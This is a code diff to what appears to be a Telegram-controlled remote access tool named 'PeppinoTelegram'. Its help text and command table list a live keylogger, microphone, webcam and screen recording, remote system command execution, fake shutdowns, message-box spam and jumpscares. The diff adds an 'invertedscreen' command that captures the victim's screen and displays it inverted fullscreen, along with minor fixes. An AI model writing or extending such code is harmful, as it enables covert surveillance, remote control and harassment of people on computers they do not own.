@@ -11,7 +11,7 @@ from PIL import Image
 from cv2 import (VideoWriter, VideoCapture, imwrite, imshow, imread, resize, waitKey,
                  setWindowProperty, WND_PROP_TOPMOST, cvtColor, COLOR_BGR2RGB, VideoWriter_fourcc,
                  destroyAllWindows, WND_PROP_FULLSCREEN, WINDOW_FULLSCREEN, namedWindow, Mat, 
-                 CAP_PROP_FRAME_WIDTH, CAP_PROP_FRAME_HEIGHT, dnn)
+                 CAP_PROP_FRAME_WIDTH, CAP_PROP_FRAME_HEIGHT, dnn, bitwise_not)
 
 #MERGE AUDIO&VIDEO
 from moviepy.editor import AudioFileClip, VideoFileClip
@@ -123,6 +123,7 @@ screenclip - Record screen.
 messagebox - Show a custom message box.  
 messagespam - Spam message boxes.  
 fakeshutdown - Fake system shutdown.  
+invertedscreen - Shows inverted colors screenshot.
 execute - Run system command.  
 microphone - Record mic audio.  
 browser - Open URL in browser.
@@ -192,6 +193,8 @@ def show_image_fullscreen(image) -> None:
     waitKey(1250)
     destroyAllWindows()
 
+def invert_image(imagearray:np.array) -> np.array:
+    return bitwise_not(imagearray)
 
 def detect_face(cap:VideoCapture|None=None) -> tuple[int,Mat]:
     if not FACERECOGNITION:
@@ -284,8 +287,6 @@ def toducky(payload) -> str:
         final += "\n"
 
     return(final.replace("pg.hotkey)\n", ""))
-
-
 class ButtonsMenu:
     def __init__(self, chat_id: int, bot: Bot, buttons: dict[str, Callable], label: str = "Choose an action", autosend: bool=True, next_btn: bool=False, page_limit: int = 8, page: int=0) -> None:
         self.bot = bot
@@ -499,6 +500,7 @@ class PeppinoTelegram:
             "livekeylogger":self.live_keylogger,
             "microphone":self.send_record_audio,
             "help":lambda: self.bsend(self.help),
+            "invertedscreen":self.inverted_screen,
             "fullclip":self.record_webcam_and_screen,
             "duckyhelp":lambda: self.bsend(self.duckyhelp),
             "id":lambda:self.bsend(f"CHAT_ID: {self.owner_id}"),
@@ -586,7 +588,7 @@ class PeppinoTelegram:
             sp_win = Thread(target=self.message_box, args=["Warning", text,])
             sp_win.start()
 
-    def show_image(self, image_path: int) -> None:
+    def show_image(self, image_path: str) -> None:
         try:
             imshow("Warning", resize(imread(image_path), (400, 400)))
             setWindowProperty("Warning", WND_PROP_TOPMOST, 1)
@@ -872,6 +874,13 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'
     
     def breath(self) -> None:
         self.__play_loaded_sound("breath")
+    
+    def inverted_screen(self) -> None:
+        filename = join(BURN_DIRECTORY, randompngname())
+        pg.screenshot(filename)
+        img = imread(filename)
+        inverted_img = invert_image(img)
+        show_image_fullscreen(inverted_img)
     
     def jumpscare(self, image=None, audio=None, playaudio=True, showimage=True) -> None:
         set_volume(100)
